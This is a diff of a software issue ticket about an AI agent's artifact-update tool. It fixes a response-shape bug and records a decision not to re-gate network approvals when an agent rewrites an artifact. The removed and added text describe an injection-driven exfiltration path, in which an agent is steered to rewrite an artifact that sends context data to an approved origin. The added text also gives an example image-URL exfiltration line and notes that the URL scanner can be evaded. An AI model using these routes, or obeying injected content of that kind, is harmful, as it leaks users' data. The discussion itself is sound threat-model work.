@@ -5,33 +5,45 @@ deps: []
 links: [av-e0yj]
 created: 2026-08-03T05:01:45Z
 type: bug
-priority: 2
+priority: 3
 assignee: Max Omdal
-tags: [security, agent, api, allowlist]
+tags: [agent, api, ui]
 ---
-# Agent body rewrites inherit prior network approvals and never surface the new footprint
+# Agent updates report nothing: no id, no saved event, no preview refresh, no footprint
 
-PATCH /api/artifacts/:id deliberately keeps the artifact's existing decision='allow' rows when the body is rewritten (internal/api/artifacts.go:397-405). For a human edit that is right: the edit page re-runs the approval gate off network_footprint / footprint_changed in the response (:414-433). For an agent edit nothing re-runs it — the gate is UI-side, and the agent path has no UI in that loop.
+update_artifact reads a.id / a.title from the PATCH response, but that response is updateArtifactResponse — {artifact:{...}, network_footprint, footprint_changed} (internal/api/artifacts.go:443-447). There is no top-level id or title, so both are undefined. Three things follow:
 
-Consequence: an artifact that was once approved for some origin keeps that approval across an unlimited number of agent rewrites of its source. The user approved origin X for the code they saw; the code is now different and X is still open. Combined with av-e0yj (the agent can be steered to rewrite an artifact by injected content) this is a working exfiltration channel — take data the model has in context, emit a body that POSTs it to the already-approved origin, save. The CSP does not stop it because the origin is genuinely on the allowlist.
+1. The model is told 'Updated artifact undefined ("undefined")'.
+2. details.artifactId is undefined, so Session.noteArtifactSaved returns early on the empty id (internal/agent/agent.go:463-466) and NO exhibit_artifact_saved event is emitted. The htmx preview refresh (av-6m3e) therefore never fires on a modification — only the create path works. Likely a contributor to Exh-m3bg (agent window feels unpredictable).
+3. exhibit.ts:115-121 also omits footprint from the update details, which create_artifact does include (:89-96), so the chat UI's "it references external origins ..." note (web/gallery/agent.js:287-289) is skipped. A user is told when a NEW artifact wants an origin they have not approved; they are told nothing when a modified one does. Those origins are CSP-blocked either way — the gap is that the user is never prompted to make the origin decision.
 
-It is also silent. internal/agent/ext/exhibit.ts:115-121 returns details WITHOUT a footprint field on update (create_artifact does include one, :89-96), so Session.noteArtifactSaved marshals footprint:null (internal/agent/agent.go:470-478) and the chat UI's "it references external origins ..." note is skipped (web/gallery/agent.js:287-289). A user watching the chat is told a new artifact wants the network; they are told nothing when a modified one does.
+Nothing tests any of this: cmd/mockllm exercises the update path but no test asserts the event.
 
-Adjacent correctness bug found while tracing this, same code path: update_artifact reads a.id / a.title from the PATCH response, but that response is updateArtifactResponse — {artifact:{...}, network_footprint, footprint_changed} (internal/api/artifacts.go:443-447). There is no top-level id or title, so both are undefined. The model is told 'Updated artifact undefined ("undefined")', details.artifactId is undefined, and noteArtifactSaved returns early on the empty id (agent.go:463-466) — so NO exhibit_artifact_saved event is emitted on update, and the htmx preview refresh (av-6m3e) never fires for a modification. Only the create path works. Nothing tests this: cmd/mockllm exercises update but no test asserts the event. Likely a contributor to Exh-m3bg.
+## Not in scope: re-approval on rewrite
+
+This ticket originally proposed dropping or re-gating an artifact's decision='allow' rows when an agent rewrote its body, on the theory that an approval should not outlive the code it was granted for. That is rejected, and the reasoning is recorded here so it is not re-proposed:
+
+- Users approve ORIGINS, not code. Running unreviewed code safely is the entire purpose of the sandbox (architecture.md §4, spec §6). Re-gating on a body change is code review by another name, and since the agent tools always save complete documents rather than diffs, it would fire on every edit — approval fatigue, which is itself a security failure.
+- Nothing about a rewrite is detectable in a way that matters. buildCSP applies one flat allowlist to every directive (internal/render/render.go:194-201), so an approved origin is reachable via script-src, connect-src, img-src, font-src, media-src and form-action simultaneously; "this origin used to be a script import and is now a fetch" describes no change in capability. Exfiltration does not even need connect-src — <img src="https://X/?d=DATA"> carries the payload in the URL. And the scanner is deliberately evadable (spec §6.2, a literal-URL heuristic over inline JS), so a rewrite that actually wants to exfiltrate constructs the URL at runtime and any such signal stays silent. Noisy on benign edits, blind on hostile ones.
+
+Accepted risk, to be stated plainly in docs/security.md rather than tracked as an open gap: approving an origin for an artifact grants that artifact egress to that origin for whatever code it later contains, including code an agent wrote. What bounds the damage is not post-hoc review of the code but what data is reachable inside the sandbox at all — which is av-e0yj (keeping other artifacts out of the agent's reach), and the origin decision itself.
+
+Note for later: if an actual control is ever wanted here it is per-directive allowlists (approve esm.sh for script-src only, so a fetch to it is browser-blocked regardless of any scan), which is enforcement rather than marking. Separate and larger; not this ticket.
 
 ## Design
 
-Two separable fixes; do the enforcement one first.
+Fix the response read and plumb the two missing fields.
 
-Enforcement — an approval must not outlive the code it was granted for. When a body rewrite changes the footprint (footprint_changed is already computed, artifacts.go:422-424), the allow rows for origins that are no longer justified by the new body should be dropped, and origins the user has not seen must never be inherited. Simplest defensible rule: on any body rewrite, keep only the intersection of the prior allow set and the new scan, and re-gate anything else. That preserves the common "same origins, edited code" case with no prompting while closing "approved for the old body, reused by the new one". Decide whether an agent-originated rewrite should be stricter still (drop all allow rows and force re-approval) — the agent path has no human reading the diff, which is the difference that matters.
+- exhibit.ts update_artifact: read r.artifact.id / r.artifact.title, and include footprint (and footprint_changed) in the returned details the way create_artifact already does.
+- Session.noteArtifactSaved already forwards details["footprint"] (agent.go:470-478) — once the field is populated the existing agent.js branch renders the note with no UI change.
+- Surfacing the footprint on update is an ORIGIN decision, not a code review: the origins are new, unapproved, and currently blocked. Telling the user is what lets them approve, exactly as the create path does.
 
-Reporting — make the update path say what the create path says: add footprint (and footprint_changed) to update_artifact's details in exhibit.ts, plumb them through noteArtifactSaved, and let the existing agent.js branch render the note. Fix the response-shape bug in the same change (read r.artifact.id / r.artifact.title) — until it is fixed, details.artifactId is undefined and the preview never refreshes after a modification.
+Sequence after av-e0yj: it is rewriting the same tool functions (dropping the id parameter), and it is allowed to fix this response read as it passes through. If it does, this ticket narrows to the footprint field and the tests.
 
 ## Acceptance Criteria
 
-1. An artifact with origin X approved, rewritten through update_artifact into a body that contacts X, is NOT network-enabled for X without a fresh explicit approval when the footprint changed.
-2. A body rewrite whose footprint is unchanged does not re-prompt and does not lose approvals (no regression on the existing edit flow).
-3. update_artifact returns the artifact id, title, footprint, and footprint_changed; a test asserts the values are defined, not undefined.
-4. A successful update emits exhibit_artifact_saved and the agent preview pane swaps — covered by a test on the update path, not only the create path.
-5. The chat UI shows the pending-approval note after a modification introduces a new origin, as it already does after a creation.
-
+1. update_artifact returns a defined artifact id and title; a test asserts they are not undefined.
+2. A successful update emits exhibit_artifact_saved and the agent preview pane swaps — covered by a test on the update path, not only the create path.
+3. The chat UI shows the pending-approval note after a modification introduces an unapproved origin, as it already does after a creation.
+4. Approvals are NOT dropped or re-gated on a body rewrite; a test pins that an artifact with origin X approved still has X approved after an agent update.
+5. docs/security.md states the accepted risk: an approved origin grants egress for whatever code the artifact later contains.
